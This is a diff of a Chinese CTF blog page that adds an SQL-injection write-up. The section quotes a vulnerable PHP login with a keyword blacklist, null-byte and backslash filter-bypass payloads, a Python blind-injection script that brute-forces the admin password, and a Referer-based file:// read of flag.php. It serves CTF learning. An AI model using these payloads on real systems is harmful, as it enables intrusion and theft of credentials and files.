@@ -21,7 +21,10 @@
 <meta property="og:image" content="https://ocgittt.github.io/2019/09/25/NJUPTCTF2019/upload_s.png">
 <meta property="og:image" content="https://ocgittt.github.io/2019/09/25/NJUPTCTF2019/upload.png">
 <meta property="og:image" content="https://ocgittt.github.io/2019/09/25/NJUPTCTF2019/error.png">
-<meta property="og:updated_time" content="2019-11-29T02:03:40.137Z">
+<meta property="og:image" content="https://ocgittt.github.io/2019/09/25/NJUPTCTF2019/sqlistart.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/09/25/NJUPTCTF2019/sqlireg.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/09/25/NJUPTCTF2019/sqliflag.png">
+<meta property="og:updated_time" content="2019-12-12T14:21:33.683Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="NJUPTCTF2019">
 <meta name="twitter:description" content="fake XML cookbook">
@@ -190,6 +193,69 @@
 <p>问题可能出在没写全GIF89a?
 前两天还能访问题目网址今天没课想做一下就不行了</p>
 <img src="/2019/09/25/NJUPTCTF2019/error.png">
+
+<h2 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h2><p>NCTF的SQLi现在已经做不了了,就做一下另一道类似的
+这也是<a href="http://pcat.cc/q.php" target="_blank" rel="noopener">某个群的入群题</a>
+题目地址:<a href="http://47.102.127.194:8801/" target="_blank" rel="noopener">http://47.102.127.194:8801/</a></p>
+<img src="/2019/09/25/NJUPTCTF2019/sqlistart.png">
+
+<p>随便输入用户名和密码,得到check.php源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"></span><br><span class="line">$check_list = <span class="string">"/into|load_file|0x|outfile|by|substr|base|echo|hex|mid|like|or|char|union|or|select|greatest|%00|_|\'|admin|limit|=_| |in|&lt;|&gt;|-|user|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i"</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match($check_list, $_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;h1&gt;Hacking first,then login!Username is very special.&lt;/h1&gt;'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match($check_list, $_POST[<span class="string">'passwd'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;h1&gt;Hacking first,then login!No easy password.&lt;/h1&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$query=<span class="string">"select user from user where user='$_POST[username]' and passwd='$_POST[passwd]'"</span>; </span><br><span class="line">$result = mysql_query($query);</span><br><span class="line">$result = mysql_fetch_array($result);</span><br><span class="line">$passwd = mysql_fetch_array(mysql_query(<span class="string">"select passwd from user where user='admin'"</span>));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'user'</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Welcome to CTF Training!Please login as role of admin!&lt;/h1&gt;"</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(($passwd[<span class="string">'passwd'</span>])&amp;&amp;($passwd[<span class="string">'passwd'</span>] === $_POST[<span class="string">'passwd'</span>]))&#123;</span><br><span class="line">    $url = $_SERVER[<span class="string">"HTTP_REFERER"</span>];</span><br><span class="line">    $parts = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $parts[<span class="string">'host'</span>] != <span class="string">'localhost'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&lt;h1&gt;The website only can come from localhost!You are not admin!&lt;/h1&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        readfile($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题过滤的东西应该跟NJUPTCTF2019的SQLi差不多吧…但是这道题多了%00 | 0x | _
+过滤了<code>&#39;</code>,也过滤了<code>#</code></p>
+<p>可以考虑用%00截断末尾的单引号,虽然也过滤了%00,但是在python中用chr(0)<code>(\x00)</code>,所以问题不大</p>
+<p>因此,在username处需要用<code>\</code>来转义username后面的单引号</p>
+<p>过滤了select,所以不能执行查询语句, 可以构造简单的判断语句,if | substr | mid | ( | ) | like 都被过滤了, 因此使用与NJUPTCTF2019的SQLi一样的方法利用<code>regexp</code>进行正则匹配</p>
+<img src="/2019/09/25/NJUPTCTF2019/sqlireg.png">
+
+<p>payload:</p>
+<blockquote>
+<p>username:\</p>
+</blockquote>
+<blockquote>
+<p>password:||passwd/**/regexp/**/“^d”;%00</p>
+</blockquote>
+<p>脚本:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.102.127.194:8801/check.php"</span></span><br><span class="line">string=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnm"</span></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> string:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"username"</span> : <span class="string">"\\"</span>,</span><br><span class="line">            <span class="string">"passwd"</span> : <span class="string">"||(passwd/**/regexp/**/\"^&#123;&#125;\");"</span>.format(password+a)+chr(<span class="number">0</span>)</span><br><span class="line">        &#125; </span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        r.encoding = <span class="string">'utf-8'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Welcome to CTF Training!Please login as role of admin"</span> <span class="keyword">in</span> r.text[<span class="number">-80</span>:<span class="number">-1</span>]:</span><br><span class="line">            password+=a</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>跑出来passwd是d0itr1ght</p>
+<p>后面还需要判断host是否为localhost</p>
+<p>不是直接改host的位置,是改referer</p>
+<blockquote>
+<p>$_SERVER[‘HTTP_REFERER’] //链接到当前页面的前一页面的 URL 地址</p>
+</blockquote>
+<p>例如<code>http://123.456.789.012中host为123.456.789.012,协议为http</code></p>
+<p><code>readfile($url);</code>这个是输出文件函数,<code>$url</code>是可控的,因此可以利用这个来读flag</p>
+<p>根据提示,flag在/var/www/html/flag.php</p>
+<p>payload:</p>
+<blockquote>
+<p>file://localhost/var/www/html/flag.php</p>
+</blockquote>
+<img src="/2019/09/25/NJUPTCTF2019/sqliflag.png">
+
+
+<br>
+<br>
+sql中regexp的基本用法:
+
+<p>· 查找name字段中以’st’为开头的所有数据：</p>
+<blockquote>
+<p>mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP ‘^st’;</p>
+</blockquote>
+<p>· 查找name字段中以’ok’为结尾的所有数据：</p>
+<blockquote>
+<p>mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP ‘ok$’;</p>
+</blockquote>
+<p>· 查找name字段中包含’mar’字符串的所有数据：</p>
+<blockquote>
+<p>mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP ‘mar’;</p>
+</blockquote>
+<p>查找name字段中以元音字符开头或以’ok’字符串结尾的所有数据：</p>
+<blockquote>
+<p>mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP ‘^[aeiou]|ok$’;</p>
+</blockquote>
+
       
 
       
@@ -272,9 +338,18 @@
   
 <nav id="article-nav">
   
+    <a href="/2019/09/25/JarvisOJ/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          jarvisOJ
+        
+      </div>
+    </a>
   
-    <a href="/2019/09/25/JarvisOJ/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">jarvisOJ</div>
+  
+    <a href="/2019/09/18/爬虫学习/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">爬虫学习</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -301,7 +376,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fake-XML-cookbook"><span class="toc-number">1.</span> <span class="toc-text">fake XML cookbook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload-your-shell"><span class="toc-number">2.</span> <span class="toc-text">Upload your shell</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fake-XML-cookbook"><span class="toc-number">1.</span> <span class="toc-text">fake XML cookbook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload-your-shell"><span class="toc-number">2.</span> <span class="toc-text">Upload your shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLi"><span class="toc-number">3.</span> <span class="toc-text">SQLi</span></a></li></ol>
                     </div>
                 </span>
             </div>
